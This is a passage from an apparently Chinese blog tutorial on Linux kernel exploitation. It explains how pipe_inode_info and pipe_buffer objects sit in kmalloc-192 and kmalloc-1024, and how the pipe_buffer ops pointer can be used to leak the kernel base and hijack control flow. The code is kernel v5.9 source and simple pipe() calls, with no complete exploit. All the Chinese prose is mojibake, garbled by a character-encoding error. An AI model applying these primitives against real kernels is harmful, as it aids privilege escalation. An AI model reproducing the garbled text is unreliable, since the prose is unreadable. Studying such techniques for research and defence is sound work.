      <p>å› ä¸º<code>__ksymtab</code>æ˜¯ä¸ä¼šè¢«è¯¥æœºåˆ¶å½±å“çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è‚¯å®šå¯ä»¥åœ¨æ²¡æœ‰å¼€å¯KASLRçš„æ—¶å€™é€šè¿‡<code>kallsym</code>æ¥è·å–åˆ°è¯¥åœ°å€ï¼Œæ¥ç€å°±å¯ä»¥æ‰¾åˆ°å¯¹åº”å‡½æ•°çš„<code>kernel_symbol</code>ç»“æ„ä½“åç§»ï¼Œå¦‚ä¸‹æ‰€ç¤º</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330113641265.png" alt="image-20220330113641265"></p>
<p>æ‰€ä»¥å°±å¯ä»¥è¿™æ ·æ¥å¾—åˆ°å¯¹åº”çš„ä»»æ„åœ°å€ï¼Œè®¡ç®—çš„æ—¶å€™å¯ä»¥è¿™æ ·è®¡ç®—ï¼Œé€šè¿‡è¡¥ç æ¥è¿›è¡Œè®¡ç®—æ›´å¿«ä¸€ç‚¹ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330113813160.png" alt="image-20220330113813160"></p>

        <h2 id="7-pipeç®¡é“â€”kmalloc-1024-kmalloc-192"   >
          <a href="#7-pipeç®¡é“â€”kmalloc-1024-kmalloc-192" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-pipeç®¡é“â€”kmalloc-1024-kmalloc-192" class="headerlink" title="7.pipeç®¡é“â€”kmalloc-1024/kmalloc-192"></a>7.pipeç®¡é“â€”kmalloc-1024/kmalloc-192</h2>
      <p>å‚ç…§ï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Rong_Toa/article/details/116270704" >(31æ¡æ¶ˆæ¯) Linuxç³»ç»Ÿè°ƒç”¨ï¼špipe()ç³»ç»Ÿè°ƒç”¨æºç åˆ†æ_rtoaxçš„åšå®¢-CSDNåšå®¢_linux pipe æºç </a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>****</p>
<p>é€šå¸¸æ¥è®²ï¼Œç®¡é“ç”¨æ¥åœ¨çˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹ä¹‹é—´é€šä¿¡ï¼Œå› ä¸º<code>fork</code>å‡ºæ¥çš„å­è¿›ç¨‹ä¼šç»§æ‰¿çˆ¶è¿›ç¨‹çš„æ–‡ä»¶æè¿°ç¬¦å‰¯æœ¬ã€‚è¿™é‡Œå°±ä½¿ç”¨å½“å‰è¿›ç¨‹æ¥åˆ›å»ºç®¡é“ç¬¦ï¼Œä»ç®¡é“çš„è¯»å–ç«¯(<code>pipe_fd[0]</code>)å’Œå†™å…¥ç«¯(<code>pipe_fd[1]</code>)æ¥è¿›è¡Œåˆ©ç”¨ã€‚</p>

        <h3 id="1-ä½¿ç”¨æ–¹æ³•"   >
          <a href="#1-ä½¿ç”¨æ–¹æ³•" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ä½¿ç”¨æ–¹æ³•" class="headerlink" title="(1)ä½¿ç”¨æ–¹æ³•"></a>(1)ä½¿ç”¨æ–¹æ³•</h3>
      
        <h4 id="â‘ åˆ›å»º"   >
          <a href="#â‘ åˆ›å»º" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åˆ›å»º" class="headerlink" title="â‘ åˆ›å»º"></a>â‘ åˆ›å»º</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ä½¿ç”¨pipeæˆ–è€…pipe2</span></span><br><span class="line"><span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">pipe(pipe_fd);<span class="comment">//é»˜è®¤é˜»å¡çŠ¶æ€</span></span><br><span class="line"><span class="comment">//pipe2(pipe_fd,flag);</span></span><br></pre></td></tr></table></div></figure>

<p>å…¶ä¸­<code>pipe2</code>å‡½æ•°æˆ–è€…ç³»ç»Ÿè°ƒç”¨<code>__NR_pipe2</code>çš„<code>flag</code>æ”¯æŒé™¤0ä¹‹å¤–çš„ä¸‰ç§æ¨¡å¼ï¼Œå¯ç”¨åœ¨<code>man</code>æ‰‹å†Œä¸­æŸ¥çœ‹ã€‚</p>
<p>å¦‚æœä¼ å…¥çš„<code>flag</code>ä¸º0ï¼Œåˆ™å’Œ<code>pipe</code>å‡½æ•°æ˜¯ä¸€æ ·çš„ï¼Œæ˜¯é˜»å¡çš„ã€‚</p>
<p>é˜»å¡çŠ¶æ€ï¼šå³å½“æ²¡æœ‰æ•°æ®åœ¨ç®¡é“ä¸­æ—¶ï¼Œå¦‚æœè¿˜è°ƒç”¨<code>read</code>ä»ç®¡é“è¯»å–æ•°æ®ï¼Œé‚£ä¹ˆå°±ä¼šä½¿å¾—ç¨‹åºå¤„äºé˜»å¡çŠ¶æ€ï¼Œå…¶ä»–çš„ä¹Ÿæ˜¯ç±»ä¼¼çš„æƒ…å†µã€‚</p>
<p>ä¼šé»˜è®¤åˆ›å»ºä¸¤ä¸ªfdæ–‡ä»¶æè¿°ç¬¦çš„ï¼Œè¯¥fdæ–‡ä»¶æè¿°ç¬¦æ•ˆæœçš„ç›¸å…³ç»“æ„å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9  /fs/pipe.c</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">pipefifo_fops</span> =</span> &#123;</span><br><span class="line">	.open		= fifo_open,</span><br><span class="line">	.llseek		= no_llseek,</span><br><span class="line">	.read_iter	= pipe_read,</span><br><span class="line">	.write_iter	= pipe_write,</span><br><span class="line">	.poll		= pipe_poll,</span><br><span class="line">	.unlocked_ioctl	= pipe_ioctl,</span><br><span class="line">	.release	= pipe_release,</span><br><span class="line">	.fasync		= pipe_fasync,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>æ”¾å…¥åˆ°<code>pipe_fd</code>ä¸­ï¼Œå¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line">pipe(pipe_fd);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pipe_fd[0]:%d\n&quot;</span>,pipe_fd[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pipe_fd[1]:%d\n&quot;</span>,pipe_fd[<span class="number">1</span>]);</span><br></pre></td></tr></table></div></figure>

<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509161948796.png" alt="image-20220509161948796"></p>
<p>ä¹‹åä½¿ç”¨<code>write/read</code>æ¥å†™å…¥è¯»å–å³å¯ï¼Œæ³¨æ„å†™å…¥ç«¯ä¸º<code>fd[1]</code>ï¼Œè¯»å–ç«¯ä¸º<code>fd[0]</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">0x8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span>* msg = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;</span><br><span class="line">write(pipe_fd[<span class="number">1</span>],msg,<span class="number">0x8</span>);</span><br><span class="line">read(pipe_fd[<span class="number">0</span>],buf,<span class="number">0x8</span>);</span><br></pre></td></tr></table></div></figure>




        <h4 id="â‘¡é‡Šæ”¾"   >
          <a href="#â‘¡é‡Šæ”¾" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡é‡Šæ”¾" class="headerlink" title="â‘¡é‡Šæ”¾"></a>â‘¡é‡Šæ”¾</h4>
      <p>ç”±äº<code>pipe</code>ç®¡é“åˆ›å»ºåä¼šå¯¹åº”åˆ›å»ºæ–‡ä»¶æè¿°ç¬¦ï¼Œæ‰€ä»¥é‡Šæ”¾ä¸¤ç«¯å¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦å³å¯é‡Šæ”¾ç®¡é“<code>pipe</code>ç®¡é“</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line">close(pipe_fd[<span class="number">1</span>]);</span><br></pre></td></tr></table></div></figure>

<p>éœ€è¦å°†ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦fdéƒ½ç»™é‡Šæ”¾æ‰æˆ–è€…ä½¿ç”¨<code>read</code>å°†ç®¡é“ä¸­æ‰€æœ‰æ•°æ®éƒ½è¯»å–å‡ºæ¥ï¼Œæ‰ä¼šè¿›å…¥<code>free_pipe_info</code>å‡½æ•°æ¥é‡Šæ”¾åœ¨çº¿æ€§æ˜ å°„åŒºåŸŸç”³è¯·çš„ç›¸å…³å†…å­˜èµ„æºï¼Œå¦åˆ™è¿˜æ˜¯ä¸ä¼šè¿›å…¥çš„ã€‚</p>

        <h3 id="2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾"   >
          <a href="#2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾" class="headerlink" title="(2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾"></a>(2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾</h3>
      
        <h4 id="â‘ åˆ†é…"   >
          <a href="#â‘ åˆ†é…" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åˆ†é…" class="headerlink" title="â‘ åˆ†é…"></a>â‘ åˆ†é…</h4>
      <p>å‘ç”Ÿåœ¨è°ƒç”¨<code>pipe</code>/<code>pipe2</code>å‡½æ•°ï¼Œæˆ–è€…ç³»ç»Ÿè°ƒç”¨<code>__NR_pipe</code>/<code>__NR_pipe2</code>æ—¶ï¼Œå†…æ ¸å…¥å£ä¸º</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE2(pipe2, <span class="keyword">int</span> __user *, fildes, <span class="keyword">int</span>, flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> do_pipe2(fildes, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE1(pipe, <span class="keyword">int</span> __user *, fildes) <span class="comment">/* pipe() ç³»ç»Ÿè°ƒç”¨ */</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> do_pipe2(fildes, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>å‡½æ•°è°ƒç”¨é“¾ï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">do_pipe2()-&gt;__do_pipe_flags()-&gt;create_pipe_files()-&gt;get_pipe_inode()-&gt;alloc_pipe_info()</span><br></pre></td></tr></table></div></figure>

<p>è°ƒç”¨ä¹‹åä¼šåœ¨å†…æ ¸çš„çº¿æ€§æ˜ å°„åŒºåŸŸè¿›è¡Œå†…å­˜åˆ†é…ï¼Œä¹Ÿå°±æ˜¯å¸¸è§çš„å†…æ ¸å †ç®¡ç†çš„åŒºåŸŸã€‚åˆ†é…ç‚¹åœ¨å¦‚ä¸‹å‡½æ•°ä¸­ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /fs/pipe.c</span></span><br><span class="line"><span class="function">struct pipe_inode_info *<span class="title">alloc_pipe_info</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> pipe_bufs = PIPE_DEF_BUFFERS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//#define PIPE_DEF_BUFFERS	16</span></span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//pipe_inode_infoç®¡ç†ç»“æ„ï¼Œå¤§å°ä¸º0xa0ï¼Œå±äºkmalloc-192</span></span><br><span class="line">	pipe = kzalloc(<span class="keyword">sizeof</span>(struct pipe_inode_info), GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (pipe == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">goto</span> out_free_uid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//ç›¸å…³çš„æ¶ˆæ¯ç»“æ„ä¸ºpipe_bufferæ•°ç»„,æ€»å…±16*0x28=0x280,ç›´æ¥ä»kmalloc-1024ä¸­æ‹¿å–å †å—</span></span><br><span class="line">	pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="keyword">sizeof</span>(struct pipe_buffer),</span><br><span class="line">			     GFP_KERNEL_ACCOUNT);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">	<span class="comment">//å¯¹ç”³è¯·çš„pipeç®¡é“è¿›è¡Œä¸€äº›åˆå§‹åŒ–</span></span><br><span class="line">	<span class="keyword">if</span> (pipe-&gt;bufs) &#123;</span><br><span class="line">		init_waitqueue_head(&amp;pipe-&gt;rd_wait);</span><br><span class="line">		init_waitqueue_head(&amp;pipe-&gt;wr_wait);</span><br><span class="line">		pipe-&gt;r_counter = pipe-&gt;w_counter = <span class="number">1</span>;</span><br><span class="line">		pipe-&gt;max_usage = pipe_bufs;</span><br><span class="line">		pipe-&gt;ring_size = pipe_bufs;</span><br><span class="line">		pipe-&gt;nr_accounted = pipe_bufs;</span><br><span class="line">		pipe-&gt;user = user;</span><br><span class="line">		mutex_init(&amp;pipe-&gt;mutex);</span><br><span class="line">		<span class="keyword">return</span> pipe;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//å‡ºé”™çš„è¯åˆ™ä¼šé‡Šæ”¾æ‰ï¼Œå…·ä½“å¹²å•¥çš„ä¸å¤ªæ¸…æ¥š</span></span><br><span class="line">out_free_uid:</span><br><span class="line">	free_uid(user);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ç›¸å…³çš„<code>pipe_inode_info</code>ç»“æ„å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /include/linux/pipe_fs_i.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line">	<span class="keyword">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> head;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> tail;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> max_usage;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="keyword">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> nr_accounted;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> readers;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> writers;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> files;<span class="comment">//æ–‡ä»¶æè¿°ç¬¦è®¡æ•°ï¼Œéƒ½ä¸º0æ—¶æ‰ä¼šé‡Šæ”¾ç®¡é“</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> r_counter;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> w_counter;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line">    <span class="comment">//pipe_bufferæ•°ç»„,16ä¸ª,æ¯ä¸ªå¤§å°ä¸º0xa0,é€šå¸¸æˆ‘ä»¬ä»è¿™ä¸Šé¢æ³„éœ²åœ°å€æˆ–è€…åŠ«æŒç¨‹åºæµ</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>




        <h4 id="â‘¡é‡Šæ”¾-1"   >
          <a href="#â‘¡é‡Šæ”¾-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡é‡Šæ”¾-1" class="headerlink" title="â‘¡é‡Šæ”¾"></a>â‘¡é‡Šæ”¾</h4>
      <p>ç›´æ¥ä½¿ç”¨<code>close</code>å‡½æ•°é‡Šæ”¾ç®¡é“ç›¸å…³çš„æ–‡ä»¶æè¿°ç¬¦fdä¸¤ç«¯ã€‚</p>
<p>å‡½æ•°é“¾è°ƒç”¨é“¾ï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pipe_release()-&gt;put_pipe_info()-&gt;free_pipe_info()</span><br></pre></td></tr></table></div></figure>

<p>éœ€è¦æ³¨æ„çš„æ—¶ï¼Œåœ¨<code>put_pipe_info</code>å‡½æ•°ä¸­</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /fs/pipe.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">put_pipe_info</span><span class="params">(struct inode *inode, struct pipe_inode_info *pipe)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> kill = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	spin_lock(&amp;inode-&gt;i_lock);</span><br><span class="line">	<span class="keyword">if</span> (!--pipe-&gt;files) &#123;</span><br><span class="line">		inode-&gt;i_pipe = <span class="literal">NULL</span>;</span><br><span class="line">		kill = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	spin_unlock(&amp;inode-&gt;i_lock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å½“filesä¸º0æ‰ä¼šè¿›å…¥è¯¥å‡½æ•°</span></span><br><span class="line">	<span class="keyword">if</span> (kill)</span><br><span class="line">		free_pipe_info(pipe);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>åªæœ‰<code>pipe_inode_info</code>è¿™ä¸ªç®¡ç†ç»“æ„ä¸­çš„<code>files</code>æˆå‘˜ä¸º0ï¼Œæ‰ä¼šè¿›è¡Œé‡Šæ”¾ï¼Œä¹Ÿå°±æ˜¯ç®¡é“ä¸¤ç«¯éƒ½å…³é—­æ‰æ‰è¡Œã€‚</p>
<p>ç›¸å…³é‡Šæ”¾å‡½æ•°<code>free_pipe_info</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /fs/pipe.c</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_pipe_info</span><span class="params">(struct pipe_inode_info *pipe)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="comment">//å’Œç®¡é“ç›¸å…³çš„é‡Šæ”¾æœ‰å…³ï¼Œä¹Ÿæ˜¯ç›¸å…³çš„æ¼æ´ç‚¹</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pipe-&gt;ring_size; i++) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> pipe-&gt;bufs + i;</span><br><span class="line">		<span class="keyword">if</span> (buf-&gt;ops)</span><br><span class="line">			pipe_buf_release(pipe, buf);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="comment">//é‡Šæ”¾pipe_bufferæ•°ç»„,kmalloc-1024</span></span><br><span class="line">	kfree(pipe-&gt;bufs);</span><br><span class="line">    <span class="comment">//é‡Šæ”¾pipe_inode_infoç®¡ç†ç»“æ„,kmalloc-192</span></span><br><span class="line">	kfree(pipe);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h3 id="3-åˆ©ç”¨"   >
          <a href="#3-åˆ©ç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-åˆ©ç”¨" class="headerlink" title="(3)åˆ©ç”¨"></a>(3)åˆ©ç”¨</h3>
      
        <h4 id="â‘ ä¿¡æ¯æ³„éœ²"   >
          <a href="#â‘ ä¿¡æ¯æ³„éœ²" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ ä¿¡æ¯æ³„éœ²" class="headerlink" title="â‘ ä¿¡æ¯æ³„éœ²"></a>â‘ ä¿¡æ¯æ³„éœ²</h4>
      <p><code>pipe_buffer</code>ç»“æ„çš„<code>buf</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /include/linux/pipe_fs_i.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>å…¶ä¸­çš„<code>ops</code>æˆå‘˜ï¼Œå³<code>struct pipe_buf_operations</code>ç»“æ„çš„<code>pipe-&gt;bufs[i]-&gt;ops</code>ï¼Œå…¶ä¸­ä¿å­˜ç€å…¨å±€çš„å‡½æ•°è¡¨ï¼Œå¯é€šè¿‡è¿™ä¸ªæ¥æ³„éœ²å†…æ ¸åŸºåœ°å€ï¼Œç›¸å…³ç»“æ„å¦‚ä¸‹æ‰€ç¤º</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /include/linux/pipe_fs_i.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span> (*release)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">bool</span> (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">bool</span> (*get)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¡åŠ«æŒç¨‹åºæµ"   >
          <a href="#â‘¡åŠ«æŒç¨‹åºæµ" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡åŠ«æŒç¨‹åºæµ" class="headerlink" title="â‘¡åŠ«æŒç¨‹åºæµ"></a>â‘¡åŠ«æŒç¨‹åºæµ</h4>
      <p>å½“å…³é—­äº†ç®¡é“çš„ä¸¤ç«¯æ—¶ï¼Œè°ƒç”¨åˆ°<code>free_pipe_info</code>å‡½æ•°ï¼Œåœ¨æ¸…ç†<code>pipe_buffer</code>æ—¶è¿›å…¥å¦‚ä¸‹åˆ¤æ–­ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (buf-&gt;ops)</span><br><span class="line">    pipe_buf_release(pipe, buf);</span><br></pre></td></tr></table></div></figure>

<p>å½“ç®¡é“ä¸­å­˜åœ¨æœªè¢«è¯»å–çš„æ•°æ®æ—¶ï¼Œå³æˆ‘ä»¬éœ€è¦è°ƒç”¨<code>write</code>å‘ç®¡é“çš„å†™å…¥ç«¯å†™å…¥æ•°æ®</p>
